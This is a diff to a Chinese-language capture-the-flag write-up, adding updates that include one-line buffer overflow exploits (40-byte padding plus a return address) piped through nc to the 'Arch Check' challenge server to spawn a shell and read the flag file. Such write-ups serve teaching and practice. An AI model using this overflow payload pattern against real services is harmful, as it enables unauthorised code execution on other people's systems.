@@ -120,6 +120,10 @@ for i in range(len(encodeedFlag)):
 print(result)
 ```
 
+! 9/24 update 解法，因為這題沒有多做什麼防禦，可以直接 RIP 指向解碼地方接著執行即可：
+
+![](./XAYB/img/Screen%20Shot%202021-09-24%20at%208.37.58%20AM.png)
+
 ## Pwn - Arch Check
 
 題目有給目標服務以及其執行檔：
@@ -187,9 +191,22 @@ io.close()
 
 最後 Navigate 一下就可以找到 flag 的位置了（`/home/arch_check/flag`）
 
+! 9/24 更新，其實用簡單的一行 Script 就可以搞定了：
+
+```zsh
+# 直接取得 Flag
+python3 -c "import sys; sys.stdout.buffer.write(b'a'*40+b'\xdd\x11\x40\x00\x00\x00\x00\x00\ncat /home/arch_check/flag\n')" | nc up.zoolab.org 30001
+
+# Interactive Mode
+cat <(python3 -c "import sys; sys.stdout.buffer.write(b'a'*40+b'\xdd\x11\x40\x00\x00\x00\x00\x00\n')") - | nc up.zoolab.org 30001
+
+# Python 2
+cat <(python -c "print 'a'*40 + '\xdd\x11\x40\x00\x00\x00\x00\x00'") - | nc up.zoolab.org 30001
+```
+
 ## Web - text2emoji
 
-網址：http://splitline.tw:5000/。一進去首頁如下：
+[網址](http://splitline.tw:5000/)一進去的畫面如下：
 
 ![](./text2emoji/img/Screen%20Shot%202021-09-20%20at%205.54.56%20PM.png)
 
